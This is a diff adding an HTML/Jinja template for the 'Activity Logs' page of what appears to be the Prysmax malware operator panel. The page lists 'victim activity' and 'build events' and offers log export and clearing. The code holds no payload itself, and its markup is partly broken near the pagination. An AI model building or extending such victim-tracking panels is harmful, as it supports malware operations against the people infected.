@@ -1,0 +1,275 @@
+{% extends "base.html" %}
+
+{% block title %}Activity Logs - Prysmax{% endblock %}
+
+{% block content %}
+<div class="activity-logs-page">
+    <div class="page-header">
+        <h1><i class="fas fa-history"></i> Activity Logs</h1>
+        <p>Monitor all system activities and victim interactions</p>
+    </div>
+    
+    <!-- Filters -->
+    <div class="filters-section">
+        <div class="filter-card">
+            <div class="filter-group">
+                <label for="dateRange">Date Range</label>
+                <select id="dateRange" class="filter-select">
+                    <option value="today">Today</option>
+                    <option value="week">Last 7 days</option>
+                    <option value="month">Last 30 days</option>
+                    <option value="all">All time</option>
+                </select>
+            </div>
+            
+            <div class="filter-group">
+                <label for="logType">Log Type</label>
+                <select id="logType" class="filter-select">
+                    <option value="all">All Types</option>
+                    <option value="login">Login Events</option>
+                    <option value="victim">Victim Activity</option>
+                    <option value="build">Build Events</option>
+                    <option value="system">System Events</option>
+                </select>
+            </div>
+            
+            <div class="filter-group">
+                <label for="severity">Severity</label>
+                <select id="severity" class="filter-select">
+                    <option value="all">All Levels</option>
+                    <option value="info">Info</option>
+                    <option value="warning">Warning</option>
+                    <option value="error">Error</option>
+                    <option value="critical">Critical</option>
+                </select>
+            </div>
+            
+            <button class="btn btn-primary" onclick="applyFilters()">
+                <i class="fas fa-filter"></i>
+                Apply Filters
+            </button>
+        </div>
+    </div>
+    
+    <!-- Logs Table -->
+    <div class="logs-section">
+        <div class="logs-card">
+            <div class="logs-header">
+                <h3>System Activity Logs</h3>
+                <div class="logs-controls">
+                    <button class="btn btn-secondary" onclick="exportLogs()">
+                        <i class="fas fa-download"></i>
+                        Export
+                    </button>
+                    <button class="btn btn-secondary" onclick="clearLogs()">
+                        <i class="fas fa-trash"></i>
+                        Clear
+                    </button>
+                    <button class="btn btn-primary" onclick="refreshLogs()">
+                        <i class="fas fa-sync-alt"></i>
+                        Refresh
+                    </button>
+                </div>
+            </div>
+            
+            <div class="logs-table-container">
+                <table class="logs-table">
+                    <thead>
+                        <tr>
+                            <th>Timestamp</th>
+                            <th>Type</th>
+                            <th>Severity</th>
+                            <th>Source</th>
+                            <th>Message</th>
+                            <th>Details</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        {% for log in logs.items %}
+                        <tr class="log-row log-{{ log.severity }}">
+                            <td class="timestamp">
+                                <div class="time-info">
+                                    <span class="date">{{ log.timestamp.strftime('%Y-%m-%d') }}</span>
+                                    <span class="time">{{ log.timestamp.strftime('%H:%M:%S') }}</span>
+                                </div>
+                            </td>
+                            <td>
+                                <span class="log-type log-type-{{ log.type }}">
+                                    <i class="fas fa-{{ 'user' if log.type == 'login' else 'desktop' if log.type == 'victim' else 'hammer' if log.type == 'build' else 'cog' }}"></i>
+                                    {{ log.type.title() }}
+                                </span>
+                            </td>
+                            <td>
+                                <span class="severity-badge severity-{{ log.severity }}">
+                                    {{ log.severity.upper() }}
+                                </span>
+                            </td>
+                            <td class="source">{{ log.source or 'System' }}</td>
+                            <td class="message">{{ log.message }}</td>
+                            <td>
+                                {% if log.details %}
+                                <button class="btn-details" onclick="showLogDetails('{{ log.id }}')">
+                                    <i class="fas fa-info-circle"></i>
+                                </button>
+                                {% endif %}
+                            </td>
+                        </tr>
+                        {% else %}
+                        <tr>
+                            <td colspan="6" class="no-logs">
+                                <div class="empty-state">
+                                    <i class="fas fa-file-alt"></i>
+                                    <h3>No logs found</h3>
+                                    <p>No activity logs match your current filters</p>
+                                </div>
+                            </td>
+                        </tr>
+                        {% endfor %}
+                    </tbody>
+                </table>
+            </div>
+            
+                          <div class="pagination-container">
+                        <div class="pagination-info">
+                            Showing {{ logs.items|length }} of {{ logs.total }} logs
+                        </div>
+                        <div class="pagination">
+                            {% if logs.has_prev %}
+                                <button class="page-btn" onclick="location.href='{{ url_for('activity_logs', page=logs.prev_num) }}'">Previous</button>
+                            {% endif %}
+                            
+                            {% for page_num in logs.iter_pages() %}
+                                {% if page_num %}
+                                    {% if page_num != logs.page %}
+                                        <button class="page-btn" onclick="location.href='{{ url_for('activity_logs', page=page_num) }}'">{{ page_num }}</button>
+                                    {% else %}
+                                        <button class="page-btn active">{{ page_num }}</button>
+                                    {% endif %}
+                                {% else %}
+                                    <span>...</span>
+                                {% endif %}
+                            {% endfor %}
+                            
+                            {% if logs.has_next %}
+                                <button class="page-btn" onclick="location.href='{{ url_for('activity_logs', page=logs.next_num) }}'">Next</button>
+                            {% endif %}
+                        </div>
+                    </div>class="fas fa-chevron-right"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Log Details Modal -->
+<div id="logDetailsModal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <h3>Log Details</h3>
+            <button class="modal-close" onclick="closeLogDetails()">&times;</button>
+        </div>
+        <div class="modal-body">
+            <div id="logDetailsContent">
+                <!-- Log details will be loaded here -->
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+function applyFilters() {
+    const dateRange = document.getElementById('dateRange').value;
+    const logType = document.getElementById('logType').value;
+    const severity = document.getElementById('severity').value;
+    
+    // Apply filters and reload page
+    const params = new URLSearchParams();
+    if (dateRange !== 'all') params.append('date_range', dateRange);
+    if (logType !== 'all') params.append('log_type', logType);
+    if (severity !== 'all') params.append('severity', severity);
+    
+    window.location.href = '/activity-logs?' + params.toString();
+}
+
+function refreshLogs() {
+    window.location.reload();
+}
+
+function exportLogs() {
+    window.open('/api/logs/export', '_blank');
+}
+
+function clearLogs() {
+    if (confirm('Are you sure you want to clear all logs? This action cannot be undone.')) {
+        fetch('/api/logs/clear', { method: 'POST' })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    window.location.reload();
+                } else {
+                    alert('Failed to clear logs: ' + data.message);
+                }
+            });
+    }
+}
+
+function showLogDetails(logId) {
+    fetch(`/api/logs/${logId}`)
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById('logDetailsContent').innerHTML = `
+                <div class="log-detail">
+                    <h4>Log Information</h4>
+                    <div class="detail-grid">
+                        <div class="detail-item">
+                            <label>ID:</label>
+                            <span>${data.id}</span>
+                        </div>
+                        <div class="detail-item">
+                            <label>Timestamp:</label>
+                            <span>${data.timestamp}</span>
+                        </div>
+                        <div class="detail-item">
+                            <label>Type:</label>
+                            <span>${data.type}</span>
+                        </div>
+                        <div class="detail-item">
+                            <label>Severity:</label>
+                            <span>${data.severity}</span>
+                        </div>
+                        <div class="detail-item">
+                            <label>Source:</label>
+                            <span>${data.source}</span>
+                        </div>
+                        <div class="detail-item">
+                            <label>Message:</label>
+                            <span>${data.message}</span>
+                        </div>
+                    </div>
+                    ${data.details ? `
+                        <h4>Additional Details</h4>
+                        <pre class="log-details-text">${JSON.stringify(data.details, null, 2)}</pre>
+                    ` : ''}
+                </div>
+            `;
+            document.getElementById('logDetailsModal').style.display = 'flex';
+        });
+}
+
+function closeLogDetails() {
+    document.getElementById('logDetailsModal').style.display = 'none';
+}
+
+function previousPage() {
+    // Implement pagination
+}
+
+function nextPage() {
+    // Implement pagination
+}
+</script>
+{% endblock %}
+
